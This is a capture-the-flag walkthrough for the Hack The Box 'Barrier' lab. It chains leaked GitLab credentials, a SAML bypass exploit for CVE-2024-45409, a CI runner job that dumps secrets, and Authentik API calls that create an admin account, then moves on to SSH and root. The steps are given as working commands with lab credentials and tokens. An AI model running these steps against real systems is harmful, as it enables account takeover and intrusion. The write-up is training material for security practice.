# HTB Barrier Writeup

## Enumeration

### Nmap

```bash
nmap -sC -sV -p- 10.129.234.46
```

Open ports:

* 22 (SSH)
* 80 → redirect
* 443 (GitLab)
* 8080 (Tomcat)
* 9443 (Authentik)

Add hostnames:

```bash
echo "10.129.234.46 barrier.vl gitlab.barrier.vl" >> /etc/hosts
```

---

## Initial Access

### GitLab Enumeration

From the GitLab login page, the **Explore** section reveals a public repository `gitconnect`.

Inspecting the commit history of the project reveals credentials:

```
satoru : dGJ2V72SUEMsM3Ca
```

These credentials are valid, allowing login as `satoru`.

After login, no additional sensitive data is found, but another user is identified:

```
akadmin
```

---

## SAML Authentication Bypass

### Identifying the vulnerability

Accessing `/guacamole` redirects to Authentik, which is used as an Identity Provider.

GitLab supports SSO via SAML, and the version in use is vulnerable to:

```
CVE-2024-45409
```

---

### Capturing and modifying SAML

* Login to Authentik as `satoru`
* Click the GitLab application
* Intercept the request in Burp

Extract `SAMLResponse` and decode it using CyberChef:

* URL Decode
* Base64 Decode
* Inflate

Save as `saml.xml`.

---

### Exploiting

```bash
python3 cve_2024_45409.py -r saml.xml -n akadmin -e -o response.xml
```

Replace the original `SAMLResponse` with the modified one and resend.

This results in a valid session as:

```
akadmin
```

---

## GitLab Runner Exploitation

From the Admin Panel, a paused runner is found and resumed.

Create a project and add:

```yaml
image:
  name: redis:alpine
  pull_policy: if-not-present

stages:
  - build

job_build:
  stage: build
  script:
    - env
  tags:
    - auto_5e7f
```

This executes `env` inside the runner.

---

### Extracting token

From job logs:

```
AUTHENTIK_TOKEN=MqL8GPTr7y4EDMWsp7gxb2YiKEzuNpLZ2QVia8HD4MLc93vgublgL5xQEvTc
```

---

## Authentik API Exploitation

### Enumerate users

```bash
curl -L http://barrier.vl:9000/api/v3/core/users/ \
  -H "Authorization: Bearer MqL8GPTr7y4EDMWsp7gxb2YiKEzuNpLZ2QVia8HD4MLc93vgublgL5xQEvTc"
```

---

### Create user

```bash
curl -X POST http://barrier.vl:9000/api/v3/core/users/ \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer MqL8GPTr7y4EDMWsp7gxb2YiKEzuNpLZ2QVia8HD4MLc93vgublgL5xQEvTc" \
  -d '{"username":"superadmin","name":"superadmin"}'
```

---

### Set password

```bash
curl -X POST http://barrier.vl:9000/api/v3/core/users/36/set_password/ \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer MqL8GPTr7y4EDMWsp7gxb2YiKEzuNpLZ2QVia8HD4MLc93vgublgL5xQEvTc" \
  -d '{"password":"Zendeni123"}'
```

---

### Add to admin group

```bash
curl -X POST http://barrier.vl:9000/api/v3/core/groups/a38fb983-8b71-4bf2-b5a7-42ab9fdd58e8/add_user/ \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer MqL8GPTr7y4EDMWsp7gxb2YiKEzuNpLZ2QVia8HD4MLc93vgublgL5xQEvTc" \
  -d '{"pk":36}'
```

---

### Login

```
https://barrier.vl:9443
superadmin : Zendeni123
```

---

## Lateral Movement

Using the Authentik admin panel, impersonate `maki`.

Access Guacamole and obtain a shell as:

```
maki
```

---

## Credential Extraction

### Guacamole configuration

```bash
cat /etc/guacamole/guacamole.properties
```

```
guac_user : guac2024
```

---

### MySQL

```bash
mysql -u guac_user -pguac2024 guac_db
```

```sql
select * from guacamole_connection_parameter;
```

This reveals:

* SSH private key
* Passphrase:

```
3V32FN6oViMPxyzC
```

---

## SSH Access

```bash
ssh -i maki_adm maki_adm@barrier.vl -oHostKeyAlgorithms=+ssh-rsa
```

---

## Privilege Escalation

```bash
cat ~/.bash_history
```

```
sudo su
Va4kSjgTHSd55ZLv
```

```bash
sudo -i
```

---

## Flags

```bash
cat /home/maki/user.txt
cat /root/root.txt
```

---

## Summary

* Credentials exposed in GitLab commit history
* SAML authentication bypass (CVE-2024-45409)
* CI/CD runner used to leak environment variables
* Authentik API abused for privilege escalation
* Guacamole used for lateral movement
* SSH key extracted from database
* Root password recovered from bash history

---
